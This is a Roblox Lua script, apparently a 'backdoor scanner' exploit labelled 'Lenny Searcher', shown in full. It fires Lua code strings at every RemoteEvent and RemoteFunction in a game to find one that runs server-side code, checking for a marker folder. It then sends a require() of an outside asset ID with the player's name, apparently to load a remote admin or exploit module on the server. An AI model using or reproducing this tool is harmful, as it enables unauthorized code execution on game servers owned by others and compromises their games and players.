local Tween = game:GetService("TweenService")
local TweenInfos = TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0)
local randomText = Instance.new("TextLabel")
local Event

for i,v in pairs(workspace:GetChildren()) do
	if v.Name == "LENNYSSISHERE" then
		v:Destroy()
	end
end

if game:GetService("CoreGui"):FindFirstChild("LennySearcher") == nil then
	local LennySearcher = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local TextLabel_3 = Instance.new("TextLabel")
	local Status = Instance.new("TextLabel")

	LennySearcher.Name = "Lenny Searcher"
	LennySearcher.Parent = game:GetService("CoreGui")
	LennySearcher.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	Frame.Parent = LennySearcher
	Frame.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	Frame.BorderColor3 = Color3.fromRGB(0, 132, 255)
	Frame.AnchorPoint = Vector2.new(0.5,0.5)
	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame.Size = UDim2.new(0,350,0,0)
	Frame.Visible = false
	
	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Size = UDim2.new(0.529999971, 0, 0.200000003, 0)
	TextLabel.Font = Enum.Font.Gotham
	TextLabel.Text = "Len"
	TextLabel.TextColor3 = Color3.fromRGB(0, 136, 255)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 20.000
	TextLabel.TextWrapped = true
	TextLabel.TextXAlignment = Enum.TextXAlignment.Right
	
	TextLabel_2.Parent = Frame
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.Position = UDim2.new(0.529999971, 0, 0, 0)
	TextLabel_2.Size = UDim2.new(0.469999999, 0, 0.200000003, 0)
	TextLabel_2.Font = Enum.Font.Gotham
	TextLabel_2.Text = "ny"
	TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.TextScaled = true
	TextLabel_2.TextSize = 20.000
	TextLabel_2.TextWrapped = true
	TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
	
	TextLabel_3.Parent = Frame
	TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_3.BackgroundTransparency = 1.000
	TextLabel_3.Position = UDim2.new(0, 0, 0.25, 0)
	TextLabel_3.Size = UDim2.new(1, 0, 0.200000003, 0)
	TextLabel_3.Font = Enum.Font.Gotham
	TextLabel_3.Text = "Status:"
	TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_3.TextScaled = true
	TextLabel_3.TextSize = 14.000
	TextLabel_3.TextWrapped = true
	
	Status.Name = "Status"
	Status.Parent = Frame
	Status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Status.BackgroundTransparency = 1.000
	Status.Position = UDim2.new(0, 0, 0.449999988, 0)
	Status.Size = UDim2.new(1, 0, 0.550000012, 0)
	Status.Font = Enum.Font.Gotham
	Status.Text = "....."
	Status.TextColor3 = Color3.fromRGB(255, 255, 255)
	Status.TextSize = 40.000
	Status.TextWrapped = true
	Status.TextYAlignment = Enum.TextYAlignment.Top
	--Script:
	Frame.Visible = true
	Tween:Create(Frame,TweenInfos,{Size = UDim2.new(0,350,0,250), Position = UDim2.new(0.5,0,0.5,0)}):Play()
	wait(0.5)
	Status.Text = "Checking"
	wait(1)
	for _,v in pairs(game:GetDescendants()) do
		local suc, err = pcall(function()
			Status.Text = v.Name
			v.Parent:WaitForChild(v.Name)
		end)
		if suc and v then
			if v.ClassName == "RemoteEvent" then
				pcall(function() v:FireServer([==[local a = Instance.new("Folder",game:GetService("Workspace")) a.Name = "LENNYSSISHERE"]==]) end)
				local Folders = game:GetService("Workspace"):WaitForChild("LENNYSSISHERE",(0.25))
				if Folders ~= nil then
					print(v.Name)
					Event = v
					break
				end
			elseif v.ClassName == "RemoteFunction" then
				pcall(function() v:InvokeServer([==[local a = Instance.new("Folder",game:GetService("Workspace")) a.Name = "LENNYSSISHERE"]==]) end)
				local Folders = game:GetService("Workspace"):WaitForChild("LENNYSSISHERE",(0.25))
				if Folders ~= nil then
					print(v.Name)
					Event = v
					break
				end
			end
		end
	end
	if Event then
		print(Event.Name)
		Event:FireServer([==[game:GetService("Workspace"):FindFirstChild("LENNYSSISHERE"):Destroy()]==])
		game:GetService("Workspace"):FindFirstChild("LENNYSSISHERE"):Destroy()
		Status.Text = "Success"
		wait(1.5)
		Status.Text = "Closing"
		Status.TextScaled = true
		local lol = [==[require(5142410026):Fire("]==]
		lol = lol..game:GetService("Players").LocalPlayer.Name
		lol = lol..[==[")]==]
		randomText.Text = lol..""
		wait()
		if Event.ClassName == "RemoteEvent" then
			Event:FireServer(randomText.Text)
		elseif Event.ClassName == "RemoteFunction" then
			Event:InvokeServer(randomText.Text)
		end
		Tween:Create(Frame,TweenInfos,{Size = UDim2.new(0,350,0,0), Position = UDim2.new(0.5,0,0.5,0)}):Play()
		wait(0.5)
		randomText:Destroy()
		LennySearcher:Destroy()
	else
		Status.Text = "No Backdoor found"
		wait(1.5)
		Status.Text = "Closing"
		Status.TextScaled = true
		Tween:Create(Frame,TweenInfos,{Size = UDim2.new(0,350,0,0), Position = UDim2.new(0.37,0,0.5,0)}):Play()
		wait(0.5)
		LennySearcher:Destroy()
	end
end